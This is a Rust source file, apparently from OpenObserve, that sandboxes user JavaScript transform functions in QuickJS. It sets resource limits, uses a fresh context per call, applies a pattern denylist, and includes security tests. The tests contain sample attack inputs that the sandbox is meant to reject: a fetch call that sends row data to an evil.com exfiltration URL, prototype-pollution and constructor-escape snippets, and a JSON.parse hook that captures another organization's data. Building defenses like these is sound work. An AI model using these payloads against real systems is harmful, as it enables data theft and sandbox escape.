// Copyright 2026 OpenObserve Inc.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

use std::{
    cell::Cell,
    time::{Duration, Instant},
};

use config::{meta::function::RESULT_ARRAY, stats::MemorySize, utils::json};
use rquickjs::{Context, Runtime};

thread_local! {
    /// Deadline for the eval running on this thread; the interrupt handler aborts once it passes.
    static JS_DEADLINE: Cell<Option<Instant>> = const { Cell::new(None) };
}

/// Per-context memory ceiling (10MB); protects against unbounded allocation in a single eval.
const JS_MEMORY_LIMIT_BYTES: usize = 10 * 1024 * 1024;
/// Per-context stack ceiling (512KB); prevents stack overflow and runaway recursion.
const JS_MAX_STACK_SIZE_BYTES: usize = 512 * 1024;

/// Fallback when the configured limit is 0; every eval stays bounded (no unlimited option).
const DEFAULT_JS_EXEC_TIMEOUT_SECS: u64 = 5;

/// Build a fresh, security-hardened JS runtime + context.
///
/// A new context is created for every [`compile_js_function`] and [`apply_js_fn`] call rather
/// than reusing one per thread. A JS function runs against the context's shared global object,
/// so anything it leaves behind — a replaced builtin such as `JSON.parse`, an implicit global,
/// or any other mutation of a global — would otherwise persist to the next call on that worker
/// thread. Ingest workers process records from more than one organization, so a persisted
/// mutation lets one record's function observe or reinterpret the next record, including another
/// organization's data (#14868). A fresh context per call gives each record a clean global
/// object, which the denylist in `compile_js_function` cannot guarantee on its own.
///
/// Both the `Runtime` and the `Context` are returned so the caller holds the runtime for the
/// whole eval: bind them as `let (_rt, ctx) = new_js_context()?;`. The context drops before the
/// runtime (reverse declaration order), which is the order QuickJS requires. Dropping them also
/// discards any pending microtask jobs the function queued, so memory stays bounded across
/// records (a shared runtime accumulated those jobs until it hit its memory limit).
///
/// Hardening carried over from the previous thread-local runtime:
/// - memory limit (see [`JS_MEMORY_LIMIT_BYTES`]),
/// - max stack size (see [`JS_MAX_STACK_SIZE_BYTES`]),
/// - an interrupt handler that enforces the per-eval deadline (see `JS_DEADLINE`).
fn new_js_context() -> Result<(Runtime, Context), std::io::Error> {
    let rt = Runtime::new()
        .map_err(|e| std::io::Error::other(format!("Failed to create JS runtime: {e}")))?;

    // This prevents unbounded memory allocation attacks.
    rt.set_memory_limit(JS_MEMORY_LIMIT_BYTES);
    // Prevents stack overflow attacks and excessive recursion.
    rt.set_max_stack_size(JS_MAX_STACK_SIZE_BYTES);
    // A non-yielding function (e.g. `while(true){}`) would otherwise pin the thread forever.
    rt.set_interrupt_handler(Some(Box::new(|| {
        JS_DEADLINE.with(|d| d.get().is_some_and(|deadline| Instant::now() >= deadline))
    })));

    // Use Context::full() for JSON, Math, String, Array, Object, which are safe; dangerous
    // globals (eval, Function, setTimeout, etc.) are blocked by the denylist in
    // compile_js_function and bounded by the memory/stack/time limits above. rquickjs does not
    // expose individual global registration, so a narrower base context is not an option here.
    let ctx = Context::full(&rt)
        .map_err(|e| std::io::Error::other(format!("Failed to create JS context: {e}")))?;
    Ok((rt, ctx))
}

/// Compiled JS function configuration
#[derive(Clone, Debug)]
pub struct JSRuntimeConfig {
    pub function: String,
    pub params: Vec<String>,
}

impl MemorySize for JSRuntimeConfig {
    fn mem_size(&self) -> usize {
        std::mem::size_of::<JSRuntimeConfig>() + self.function.mem_size() + self.params.mem_size()
    }
}

/// Arms the thread-local eval deadline; clears it on drop (including early return/panic).
struct JsDeadlineGuard {
    deadline: Instant,
}

impl JsDeadlineGuard {
    fn new(timeout: Duration) -> Self {
        let deadline = Instant::now() + timeout;
        JS_DEADLINE.with(|d| d.set(Some(deadline)));
        Self { deadline }
    }

    fn expired(&self) -> bool {
        Instant::now() >= self.deadline
    }
}

impl Drop for JsDeadlineGuard {
    fn drop(&mut self) {
        JS_DEADLINE.with(|d| d.set(None));
    }
}

/// Verify that a hardened JS runtime + context can be created on this build.
/// A fresh context is built per function call (see [`new_js_context`]); this only checks that
/// construction succeeds, so callers can fail fast at startup rather than on the first record.
pub fn init_js_runtime() -> Result<(), String> {
    new_js_context()
        .map(|(_rt, _ctx)| ())
        .map_err(|e| e.to_string())
}

/// Compile and validate a JS function
/// Similar to compile_vrl_function but for JavaScript
pub fn compile_js_function(func: &str, org_id: &str) -> Result<JSRuntimeConfig, std::io::Error> {
    compile_js_function_inner(func, org_id, exec_timeout())
}

fn compile_js_function_inner(
    func: &str,
    _org_id: &str,
    timeout: Duration,
) -> Result<JSRuntimeConfig, std::io::Error> {
    // Basic validation: function must not be empty
    if func.trim().is_empty() {
        return Err(std::io::Error::other("JavaScript function cannot be empty"));
    }

    // Phase 1 + Phase 2 Security: Comprehensive pattern blocking
    // Use centrally-defined security patterns from o2-enterprise
    // These patterns are statically initialized and reused across all compilations
    #[cfg(feature = "enterprise")]
    {
        use o2_enterprise::enterprise::auth::js_security;
        if let Err(pattern) = js_security::check_js_security(func) {
            return Err(std::io::Error::other(format!(
                "JavaScript function contains forbidden pattern: {}",
                pattern
            )));
        }
    }

    #[cfg(not(feature = "enterprise"))]
    {
        // Fallback patterns for non-enterprise builds
        // Note: Enterprise builds should use the centralized patterns above
        const DANGEROUS_PATTERNS: &[&str] = &[
            "eval(",
            "Function(",
            "import(",
            "globalThis",
            "window.",
            "self.",
            "global.",
            "__proto__",
            "constructor.prototype",
            "constructor.constructor",
            "setTimeout",
            "setInterval",
            "setImmediate",
            "XMLHttpRequest",
            "fetch(",
            "WebSocket",
            "require(",
            "process.",
            "__dirname",
            "__filename",
            "module.",
            "exports.",
            "Reflect.",
            "Proxy(",
        ];

        for pattern in DANGEROUS_PATTERNS.iter() {
            if func.contains(pattern) {
                return Err(std::io::Error::other(format!(
                    "JavaScript function contains forbidden pattern: {}",
                    pattern
                )));
            }
        }
    }

    // Strip #ResultArray# marker for compilation validation
    // The marker is invalid JS syntax (# is not a comment in JS)
    // We keep it in storage but remove it for compilation check
    let func_for_compilation = strip_result_array_marker(func);

    // Detect if this is a ResultArray function to use appropriate variable name
    // #ResultArray# functions use 'rows' (array), regular functions use 'row' (single object)
    // Only match #ResultArray# at the start of the function (not in comments)
    let is_result_array = RESULT_ARRAY.is_match(func);
    let var_name = if is_result_array { "rows" } else { "row" };
    let test_value = if is_result_array { "[]" } else { "{}" };

    // Execute against empty input so an obvious infinite loop is rejected at save, not at runtime.
    // A fresh context keeps validation from leaking state into (or observing state from) other
    // calls.
    let (_rt, ctx) = new_js_context()?;
    ctx.with(|ctx| {
        let test_code = format!(
            r#"
                (function() {{
                    const {} = {};
                    try {{
                        {}
                    }} catch(e) {{
                    }}
                    return JSON.stringify({{ success: true }});
                }})();
                "#,
            var_name, test_value, func_for_compilation
        );

        let guard = JsDeadlineGuard::new(timeout);
        let eval_result = ctx.eval::<String, _>(test_code);
        if guard.expired() {
            return Err(std::io::Error::other(
                "JavaScript function exceeded the execution time limit (possible infinite loop)",
            ));
        }
        // error here would mean there was some syntax error, which should be propagated
        let _: String = eval_result
            .map_err(|e| std::io::Error::other(format!("JavaScript syntax error: {}", e)))?;

        let params = vec!["row".to_string()];
        Ok(JSRuntimeConfig {
            function: func.to_string(), // Store original with marker
            params,
        })
    })
}

/// Strip #ResultArray# and #ResultArray#SkipVRL# markers from JS function
/// These markers are used to detect result-array mode but are invalid JS syntax
fn strip_result_array_marker(func: &str) -> String {
    let mut result = func.to_string();

    // Remove #ResultArray#SkipVRL# (more specific pattern first)
    result = regex::Regex::new(
        r"(?m)^#[ \s]*Result[ \s]*Array[ \s]*#[ \s]*Skip[ \s]*VRL[ \s]*#[ \s]*\n?",
    )
    .unwrap()
    .replace_all(&result, "")
    .to_string();

    // Remove #ResultArray#
    result = regex::Regex::new(r"(?m)^#[ \s]*Result[ \s]*Array[ \s]*#[ \s]*\n?")
        .unwrap()
        .replace_all(&result, "")
        .to_string();

    result
}

/// Per-eval execution budget; a configured `0` falls back to the default rather than disabling it.
pub fn exec_timeout() -> Duration {
    let secs = config::get_config()
        .limit
        .js_function_max_execution_time_secs;
    Duration::from_secs(if secs == 0 {
        DEFAULT_JS_EXEC_TIMEOUT_SECS
    } else {
        secs
    })
}

/// Apply a JS function to transform data
/// Similar to apply_vrl_fn but for JavaScript
/// Returns (transformed_value, optional_error)
pub fn apply_js_fn(
    js_config: &JSRuntimeConfig,
    row: json::Value,
    org_id: &str,
    stream_name: &[String],
) -> (json::Value, Option<String>) {
    // A fresh context per call so a function cannot leave globals behind for the next record,
    // which may belong to another organization (#14868).
    let (_rt, ctx) = match new_js_context() {
        Ok(pair) => pair,
        Err(e) => {
            log::error!(
                "{}/{:?} failed to create JS context: {}",
                org_id,
                stream_name,
                e
            );
            return (row, Some(format!("Failed to initialize JS context: {e}")));
        }
    };
    ctx.with(|ctx| {
        // Set up the execution environment
        let globals = ctx.globals();

        // Inject input data as JSON string
        let input_json = match serde_json::to_string(&row) {
            Ok(json) => json,
            Err(e) => {
                return (
                    row.clone(),
                    Some(format!("Failed to serialize input: {}", e)),
                );
            }
        };

        // Set global variables
        if let Err(e) = globals.set("inputJson", input_json.as_str()) {
            return (row.clone(), Some(format!("Failed to set input: {}", e)));
        }

        if let Err(e) = globals.set("orgId", org_id) {
            return (row.clone(), Some(format!("Failed to set orgId: {}", e)));
        }

        if let Err(e) = globals.set(
            "streamName",
            stream_name.first().unwrap_or(&String::new()).as_str(),
        ) {
            return (
                row.clone(),
                Some(format!("Failed to set streamName: {}", e)),
            );
        }

        // Strip #ResultArray# marker for execution (invalid JS syntax)
        let func_for_execution = strip_result_array_marker(&js_config.function);

        // Detect if this is a ResultArray function to use appropriate variable name
        // #ResultArray# functions use 'rows' (array), regular functions use 'row' (single
        // object)
        // Only match #ResultArray# at the start of the function (not in comments)
        let is_result_array = RESULT_ARRAY.is_match(&js_config.function);
        let var_name = if is_result_array { "rows" } else { "row" };

        // Create execution wrapper that catches errors and returns them as structured data
        // Use 'rows' for #ResultArray# functions (consistent with VRL), 'row' for regular
        // functions The function's return value is captured; if undefined, use the
        // input variable Wrap user function to capture return value or mutated
        // input For #ResultArray# functions, use 'rows' variable (array input)
        // For regular functions, use 'row' variable (single object input)
        let exec_code = format!(
            r#"
                (function() {{
                    try {{
                        var {} = JSON.parse(inputJson);
                        {}
                        // After execution, use the variable (supports mutation pattern)
                        return JSON.stringify({{ success: true, data: {} }});
                    }} catch(e) {{
                        return JSON.stringify({{
                            success: false,
                            error: e.name + ': ' + e.message,
                            line: e.lineNumber || 'unknown',
                            column: e.columnNumber || 'unknown',
                            stack: e.stack || ''
                        }});
                    }}
                }})();
                "#,
            var_name, func_for_execution, var_name
        );

        // Execute the function
        let guard = JsDeadlineGuard::new(exec_timeout());
        let eval_result = ctx.eval::<String, _>(exec_code);
        if guard.expired() {
            let msg = "JavaScript function exceeded the execution time limit".to_string();
            log::error!("{}/{:?} {}", org_id, stream_name, msg);
            return (row, Some(msg));
        }
        match eval_result {
            Ok(result_json) => {
                // Parse the result to check if there was an error
                match serde_json::from_str::<json::Value>(&result_json) {
                    Ok(result_obj) => {
                        if let Some(success) = result_obj.get("success").and_then(|v| v.as_bool())
                            && success
                        {
                            // Extract the actual data
                            if let Some(data) = result_obj.get("data") {
                                (data.clone(), None)
                            } else {
                                (row.clone(), Some("No data returned".to_string()))
                            }
                        } else if let Some(success) =
                            result_obj.get("success").and_then(|v| v.as_bool())
                            && !success
                        {
                            // Extract error details
                            let error_msg = result_obj
                                .get("error")
                                .and_then(|v| v.as_str())
                                .unwrap_or("Unknown error");
                            let line = result_obj
                                .get("line")
                                .and_then(|v| v.as_str())
                                .filter(|s| *s != "unknown");
                            let column = result_obj
                                .get("column")
                                .and_then(|v| v.as_str())
                                .filter(|s| *s != "unknown");

                            // Only append line/column if we have valid values
                            let error_message = match (line, column) {
                                (Some(l), Some(c)) => {
                                    format!("{} (line: {}, column: {})", error_msg, l, c)
                                }
                                (Some(l), None) => format!("{} (line: {})", error_msg, l),
                                (None, Some(c)) => format!("{} (column: {})", error_msg, c),
                                (None, None) => error_msg.to_string(),
                            };

                            log::error!("{}/{:?} {}", org_id, stream_name, error_message);
                            (row, Some(error_message))
                        } else {
                            (row.clone(), Some("Unexpected response format".to_string()))
                        }
                    }
                    Err(e) => (
                        row.clone(),
                        Some(format!("Failed to parse JS output: {}", e)),
                    ),
                }
            }
            Err(e) => {
                let error_msg = format!("JS execution failed: {}", e);
                log::error!("{}/{:?} {}", org_id, stream_name, error_msg);
                (row, Some(error_msg))
            }
        }
    })
}

#[cfg(test)]
mod tests {
    use serde_json::json;

    use super::*;

    #[test]
    fn test_init_js_runtime() {
        let result = init_js_runtime();
        assert!(result.is_ok());
    }

    #[test]
    fn test_compile_js_function_valid() {
        let func = r#"
            row.new_field = "test";
            row.count = 42;
        "#;
        let result = compile_js_function(func, "test_org");
        assert!(result.is_ok());
    }

    #[test]
    fn test_compile_js_function_empty() {
        let result = compile_js_function("", "test_org");
        assert!(result.is_err());
    }

    #[test]
    fn test_compile_js_function_with_eval() {
        let func = r#"eval("malicious code");"#;
        let result = compile_js_function(func, "test_org");
        assert!(result.is_err());
    }

    #[test]
    fn test_apply_js_fn_simple() {
        let func = r#"
            row.transformed = true;
            row.added_field = "hello";
        "#;
        let config = compile_js_function(func, "test_org").unwrap();
        let input = json!({"original": "value"});
        let (output, error) = apply_js_fn(&config, input, "test_org", &["test_stream".to_string()]);

        assert!(error.is_none());
        assert_eq!(output["original"], "value");
        assert_eq!(output["transformed"], true);
        assert_eq!(output["added_field"], "hello");
    }

    #[test]
    fn test_compile_rejects_infinite_loop() {
        // Executing at compile time rejects an obvious infinite loop before it can be saved.
        let start = Instant::now();
        let result =
            compile_js_function_inner("while (true) {}", "test_org", Duration::from_millis(100));
        let err = result.expect_err("infinite loop must be rejected at compile");
        assert!(
            err.to_string().contains("time limit"),
            "error should mention the time limit, got: {err}"
        );
        assert!(
            start.elapsed() < Duration::from_secs(2),
            "compile must fail fast, not hang"
        );
    }

    #[test]
    fn test_infinite_loops_are_interrupted() {
        // The deadline is enforced at runtime, so interception is independent of how the loop is
        // written; whitespace, comments and alternate loop forms all reach the same handler.
        let payloads = [
            "while (true) {}",
            "while(true){}",
            "while ( true ) { /* spin */ }",
            "while (1) {}",
            "for (;;) {}",
            "do {} while (true);",
        ];
        for src in payloads {
            let start = Instant::now();
            let _guard = JsDeadlineGuard::new(Duration::from_millis(100));
            // A per-call context still enforces the deadline: its runtime carries the interrupt
            // handler, so interruption does not depend on a shared thread-local runtime.
            let (_rt, ctx) = new_js_context().expect("context");
            let result: Result<String, _> = ctx.with(|ctx| ctx.eval(src));
            assert!(result.is_err(), "infinite loop must be interrupted: {src}");
            assert!(
                start.elapsed() < Duration::from_secs(5),
                "interrupt must fire near the deadline, not hang: {src}"
            );
        }
    }

    #[test]
    fn js_builtin_mutation_does_not_survive_the_next_call() {
        // #14868: a function can replace a builtin such as JSON.parse. The wrapper parses the
        // next record's input with JSON.parse *before* user code runs, so a replacement left on
        // a shared context would capture the following record — which, on an ingest worker, can
        // be another organization's data. With a fresh context per call the replacement cannot
        // survive, so the third call must not see the second (other-org) row.
        //
        // The hook stashes what it is given on a `JSON` property, not on an implicit global:
        // the eval runs in strict mode, where an implicit global (`x = []`) throws, which would
        // turn the leak into a per-call error and make the leak assertion below unreachable.
        // Assigning a property of an existing object is allowed in strict mode, so on a shared
        // context the leak is actually observable (and this assertion actually fails).
        let attacker = r#"
            var _orig = JSON.parse;
            if (!JSON.hooked) {
                JSON.hooked = true;
                JSON.parse = function (s) { JSON.grab = (JSON.grab || "") + s; return _orig(s); };
            }
            row.ran = true;
            row.leaked = JSON.grab || "";
        "#;
        let benign = "row.ok = true;";

        let attacker_cfg = compile_js_function(attacker, "org_a").unwrap();
        let benign_cfg = compile_js_function(benign, "org_b").unwrap();

        // 1) org A installs the hook. Its own row has captured nothing yet.
        let (out1, err1) = apply_js_fn(
            &attacker_cfg,
            json!({"org": "a", "n": 1}),
            "org_a",
            &["a".to_string()],
        );
        assert!(err1.is_none(), "call 1 should succeed: {err1:?}");
        assert_eq!(
            out1["ran"], true,
            "positive control: the function must have run"
        );

        // 2) org B's record flows through the same worker thread.
        let (_out2, err2) = apply_js_fn(
            &benign_cfg,
            json!({"org": "b", "secret": "ORG_B_SECRET_42"}),
            "org_b",
            &["b".to_string()],
        );
        assert!(err2.is_none(), "call 2 should succeed: {err2:?}");

        // 3) org A runs again and reports what its hook captured.
        let (out3, err3) = apply_js_fn(
            &attacker_cfg,
            json!({"org": "a", "n": 2}),
            "org_a",
            &["a".to_string()],
        );
        assert!(err3.is_none(), "call 3 should succeed: {err3:?}");
        assert_eq!(
            out3["ran"], true,
            "positive control: the function must have run"
        );

        let leaked = out3.get("leaked").and_then(|v| v.as_str()).unwrap_or("");
        assert!(
            !leaked.contains("ORG_B_SECRET_42"),
            "org A's function saw org B's row across calls: {leaked:?}"
        );
        // And the third call started from a clean global, so nothing was stashed at all.
        assert_eq!(
            leaked, "",
            "a fresh context must not carry a prior call's globals"
        );
    }

    #[test]
    fn js_global_object_mutation_does_not_leak_between_calls() {
        // A property added to a shared global object (here `JSON`) is allowed even in strict
        // mode. On a reused context it would persist to the next call; with a per-call context
        // it must not — the next record starts from a clean set of globals.
        let writer = "JSON.stash = 'leaked'; row.saw = (typeof JSON.stash !== 'undefined');";
        let reader = "row.saw = (typeof JSON.stash !== 'undefined');";
        let writer_cfg = compile_js_function(writer, "test_org").unwrap();
        let reader_cfg = compile_js_function(reader, "test_org").unwrap();

        let (w, we) = apply_js_fn(&writer_cfg, json!({}), "test_org", &["s".to_string()]);
        assert!(we.is_none(), "writer should succeed: {we:?}");
        assert_eq!(w["saw"], true, "the writer sees the property it just added");

        let (r, re) = apply_js_fn(&reader_cfg, json!({}), "test_org", &["s".to_string()]);
        assert!(re.is_none(), "reader should succeed: {re:?}");
        assert_eq!(
            r["saw"], false,
            "a global-object property set by a prior call must not be visible to the next"
        );
    }

    #[test]
    fn test_apply_js_fn_modify_field() {
        let func = r#"
            row.count = (row.count || 0) + 1;
            row.name = (row.name || "").toUpperCase();
        "#;
        let config = compile_js_function(func, "test_org").unwrap();
        let input = json!({"count": 5, "name": "test"});
        let (output, error) = apply_js_fn(&config, input, "test_org", &["test_stream".to_string()]);

        assert!(error.is_none());
        assert_eq!(output["count"], 6);
        assert_eq!(output["name"], "TEST");
    }

    #[test]
    fn test_compile_js_with_result_array_marker() {
        // #ResultArray# marker should not cause compilation error
        // Note: #ResultArray# functions use 'rows' (array), not 'row' (single object)
        let func = r#"#ResultArray#
rows.map(function(r) {
  r.transformed = true;
  r.type = "result_array";
  return r;
});"#;
        let result = compile_js_function(func, "test_org");
        assert!(result.is_ok());

        // Verify original function is preserved in config
        let config = result.unwrap();
        assert!(config.function.contains("#ResultArray#"));
    }

    #[test]
    fn test_compile_js_with_result_array_skip_vrl() {
        // #ResultArray#SkipVRL# marker should not cause compilation error
        // Note: #ResultArray# functions use 'rows' (array), not 'row'
        let func = r#"#ResultArray#SkipVRL#
rows.map(function(r) { r.transformed = true; return r; });"#;
        let result = compile_js_function(func, "test_org");
        assert!(result.is_ok());

        let config = result.unwrap();
        assert!(config.function.contains("#ResultArray#SkipVRL#"));
    }

    #[test]
    fn test_apply_js_with_result_array_marker() {
        // Function with #ResultArray# should execute correctly
        // Note: #ResultArray# functions receive 'rows' array, not single 'row'
        let func = r#"#ResultArray#
rows.map(function(r) {
  r.processed = true;
  r.value = 42;
  return r;
});"#;
        let config = compile_js_function(func, "test_org").unwrap();

        // Input must be an array for #ResultArray# functions
        let input = json!([{"original": "test"}]);
        let (output, error) = apply_js_fn(&config, input, "test_org", &["test_stream".to_string()]);

        assert!(error.is_none());
        let output_array = output.as_array().expect("Output should be array");
        assert_eq!(output_array.len(), 1);
        assert_eq!(output_array[0]["original"], "test");
        assert_eq!(output_array[0]["processed"], true);
        assert_eq!(output_array[0]["value"], 42);
    }

    #[test]
    fn test_strip_result_array_marker() {
        // Test basic #ResultArray# stripping
        let func1 = "#ResultArray#\nrow.field = 1;";
        let stripped1 = strip_result_array_marker(func1);
        assert!(!stripped1.contains("#ResultArray#"));
        assert!(stripped1.contains("row.field = 1;"));

        // Test #ResultArray#SkipVRL# stripping
        let func2 = "#ResultArray#SkipVRL#\nrow.field = 2;";
        let stripped2 = strip_result_array_marker(func2);
        assert!(!stripped2.contains("#ResultArray#"));
        assert!(!stripped2.contains("SkipVRL"));
        assert!(stripped2.contains("row.field = 2;"));

        // Test with whitespace variations
        let func3 = "# Result Array #\nrow.field = 3;";
        let stripped3 = strip_result_array_marker(func3);
        assert!(!stripped3.contains("# Result Array #"));
        assert!(stripped3.contains("row.field = 3;"));
    }

    #[test]
    fn test_compile_js_function_with_syntax_error() {
        // Test that undefined variable errors are caught and reported properly
        let func = r#"
            row.meta )= 0'
        "#;
        let result = compile_js_function(func, "test_org");
        assert!(result.is_err());
        let err_msg = result.unwrap_err().to_string();
        println!("Captured error message: {}", err_msg);
        // The error message should contain information about the undefined variable
        assert!(
            err_msg.contains("Exception") || err_msg.contains("syntax"),
            "Error message should mention a syntax error, got: {}",
            err_msg
        );
        // Should NOT contain "(line: unknown, column: unknown)"
        assert!(
            !err_msg.contains("unknown"),
            "Error message should not contain 'unknown', got: {}",
            err_msg
        );
    }

    #[test]
    fn test_apply_js_fn_with_runtime_error() {
        // Test runtime error handling
        let func = r#"
            row.value = undefinedVariable;
        "#;
        let config = compile_js_function(func, "test_org");
        // Compilation might succeed but execution should fail
        if let Ok(config) = config {
            let input = json!({"original": "value"});
            let (_output, error) = apply_js_fn(
                &config,
                input.clone(),
                "test_org",
                &["test_stream".to_string()],
            );

            // Should return original row and have an error
            assert!(error.is_some());
            let err_msg = error.unwrap();
            assert!(
                err_msg.contains("ReferenceError")
                    || err_msg.contains("undefinedVariable")
                    || err_msg.contains("not defined"),
                "Error message should mention the undefined variable, got: {}",
                err_msg
            );
        }
    }

    #[test]
    fn test_apply_js_fn_with_syntax_error() {
        // Test that syntax errors in the function are caught
        // Note: Severe syntax errors like unmatched braces are caught by QuickJS parser
        // before our try-catch, so we get a generic "Exception" message
        let func = r#"
            row.test = {{{;  // Invalid syntax
        "#;
        let result = compile_js_function(func, "test_org");
        assert!(result.is_err());
        let err_msg = result.unwrap_err().to_string();
        println!("Syntax error message: {}", err_msg);
        // For parse-time errors, QuickJS may not provide detailed messages
        // We just verify an error was caught
        assert!(
            err_msg.contains("failed")
                || err_msg.contains("Exception")
                || err_msg.contains("syntax"),
            "Error message should indicate failure, got: {}",
            err_msg
        );
    }

    // Note: Runtime error testing is complex because QuickJS validates during compilation
    // Real runtime errors will be caught and logged appropriately in production use

    #[test]
    fn test_result_array_uses_rows_variable() {
        // Test that #ResultArray# functions use 'rows' instead of 'row'
        // Functions mutate rows in place (rows is mutable)
        let func = r#"#ResultArray#
var total = rows.length;
var sum = rows.reduce(function(acc, r) { return acc + (r.value || 0); }, 0);
// Enrich each row in place with aggregated data
for (var i = 0; i < rows.length; i++) {
  rows[i].total_count = total;
  rows[i].sum = sum;
}"#;

        let config = compile_js_function(func, "test_org");
        if let Err(e) = &config {
            println!("Compilation error: {:?}", e);
        }
        assert!(
            config.is_ok(),
            "Should compile successfully with 'rows' variable"
        );

        let config = config.unwrap();

        // Test with array input
        let input = json!([
            {"value": 10, "id": 1},
            {"value": 20, "id": 2},
            {"value": 30, "id": 3}
        ]);

        let (output, error) = apply_js_fn(&config, input, "test_org", &["test_stream".to_string()]);

        println!("Error: {:?}", error);
        println!("Output: {:?}", output);
        assert!(error.is_none(), "Should execute without error");

        // Verify output is an array with enriched data
        let output_array = output.as_array().expect("Output should be an array");
        assert_eq!(output_array.len(), 3);

        // Check first element has aggregated data
        println!("First element: {:?}", output_array[0]);
        assert_eq!(output_array[0]["total_count"], 3);
        assert_eq!(output_array[0]["sum"], 60);
        assert_eq!(output_array[0]["value"], 10);
    }

    #[test]
    fn test_regular_function_uses_row_variable() {
        // Test that regular functions (without #ResultArray#) use 'row'
        let func = r#"
row.processed = true;
row.doubled_value = (row.value || 0) * 2;
row;"#;

        let config = compile_js_function(func, "test_org");
        assert!(
            config.is_ok(),
            "Should compile successfully with 'row' variable"
        );

        let config = config.unwrap();

        // Test with single object input
        let input = json!({"value": 15, "id": 1});

        let (output, error) = apply_js_fn(&config, input, "test_org", &["test_stream".to_string()]);

        assert!(error.is_none(), "Should execute without error");
        assert_eq!(output["processed"], true);
        assert_eq!(output["doubled_value"], 30);
        assert_eq!(output["value"], 15);
    }

    #[test]
    fn test_result_array_aggregation_functions() {
        // Test complex aggregation with #ResultArray#
        // Functions mutate rows in place instead of reassigning
        let func = r#"#ResultArray#
// Calculate statistics across all rows
var values = rows.map(function(r) { return r.value || 0; });
var sum = values.reduce(function(acc, v) { return acc + v; }, 0);
var avg = sum / rows.length;
var max = Math.max.apply(null, values);
var min = Math.min.apply(null, values);

// Enrich each row with batch statistics (in-place mutation)
for (var i = 0; i < rows.length; i++) {
  rows[i].original_value = rows[i].value;
  rows[i].batch_size = rows.length;
  rows[i].batch_avg = avg;
  rows[i].batch_sum = sum;
  rows[i].batch_max = max;
  rows[i].batch_min = min;
  rows[i].position = i + 1;
  rows[i].deviation = (rows[i].value || 0) - avg;
}"#;

        let config = compile_js_function(func, "test_org");
        assert!(config.is_ok(), "Should compile aggregation function");

        let config = config.unwrap();

        // Test with array of values
        let input = json!([
            {"value": 100, "id": "a"},
            {"value": 200, "id": "b"},
            {"value": 300, "id": "c"}
        ]);

        let (output, error) = apply_js_fn(&config, input, "test_org", &["test_stream".to_string()]);

        assert!(error.is_none(), "Should execute without error");

        let output_array = output.as_array().expect("Output should be an array");
        assert_eq!(output_array.len(), 3);

        // Verify aggregated statistics
        assert_eq!(output_array[0]["batch_size"], 3);
        assert_eq!(output_array[0]["batch_sum"], 600);
        assert_eq!(output_array[0]["batch_avg"], 200);
        assert_eq!(output_array[0]["batch_max"], 300);
        assert_eq!(output_array[0]["batch_min"], 100);
        assert_eq!(output_array[0]["position"], 1);
        assert_eq!(output_array[0]["deviation"], -100); // 100 - 200

        assert_eq!(output_array[1]["deviation"], 0); // 200 - 200
        assert_eq!(output_array[2]["deviation"], 100); // 300 - 200
    }

    #[test]
    fn test_result_array_empty_array() {
        // Test #ResultArray# with empty array input
        let func = r#"#ResultArray#
rows;"#;

        let config = compile_js_function(func, "test_org");
        assert!(config.is_ok());

        let config = config.unwrap();
        let input = json!([]);

        let (output, error) = apply_js_fn(&config, input, "test_org", &["test_stream".to_string()]);

        assert!(error.is_none());
        assert_eq!(output.as_array().unwrap().len(), 0);
    }

    #[test]
    fn test_result_array_filtering() {
        // Test #ResultArray# with filtering (returns subset)
        // Filter by removing elements that don't match
        let func = r#"#ResultArray#
// Filter in place by modifying the array
var filtered = [];
for (var i = 0; i < rows.length; i++) {
  if (rows[i].value > 50) {
    filtered.push(rows[i]);
  }
}
// Clear and rebuild rows
rows.length = 0;
for (var i = 0; i < filtered.length; i++) {
  rows.push(filtered[i]);
}"#;

        let config = compile_js_function(func, "test_org");
        assert!(config.is_ok());

        let config = config.unwrap();
        let input = json!([
            {"value": 30},
            {"value": 60},
            {"value": 40},
            {"value": 80}
        ]);

        let (output, error) = apply_js_fn(&config, input, "test_org", &["test_stream".to_string()]);

        assert!(error.is_none());
        let output_array = output.as_array().unwrap();
        assert_eq!(output_array.len(), 2); // Only values > 50
        assert_eq!(output_array[0]["value"], 60);
        assert_eq!(output_array[1]["value"], 80);
    }

    // ============================================================================
    // Phase 2 Security Hardening Tests
    // ============================================================================

    #[test]
    fn test_security_block_globalthis() {
        let func = r#"globalThis.escape = function() { return "hacked"; };"#;
        let result = compile_js_function(func, "test_org");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("globalThis"));
    }

    #[test]
    fn test_security_block_window() {
        let func = r#"window.location = "http://evil.com";"#;
        let result = compile_js_function(func, "test_org");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("window."));
    }

    #[test]
    fn test_security_block_self() {
        let func = r#"self.constructor.constructor("return this")();"#;
        let result = compile_js_function(func, "test_org");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("self."));
    }

    #[test]
    fn test_security_block_proto_pollution() {
        let func = r#"Object.__proto__.polluted = true;"#;
        let result = compile_js_function(func, "test_org");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("__proto__"));
    }

    #[test]
    fn test_security_block_constructor_prototype() {
        let func = r#"row.constructor.prototype.hack = function() {};"#;
        let result = compile_js_function(func, "test_org");
        assert!(result.is_err());
        assert!(
            result
                .unwrap_err()
                .to_string()
                .contains("constructor.prototype")
        );
    }

    #[test]
    fn test_security_block_settimeout() {
        let func = r#"setTimeout(function() { row.delayed = true; }, 1000);"#;
        let result = compile_js_function(func, "test_org");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("setTimeout"));
    }

    #[test]
    fn test_security_block_setinterval() {
        let func = r#"setInterval(function() { row.tick = true; }, 100);"#;
        let result = compile_js_function(func, "test_org");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("setInterval"));
    }

    #[test]
    fn test_security_block_fetch() {
        let func = r#"fetch("http://evil.com/exfiltrate", { method: "POST", body: JSON.stringify(row) });"#;
        let result = compile_js_function(func, "test_org");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("fetch("));
    }

    #[test]
    fn test_security_block_xmlhttprequest() {
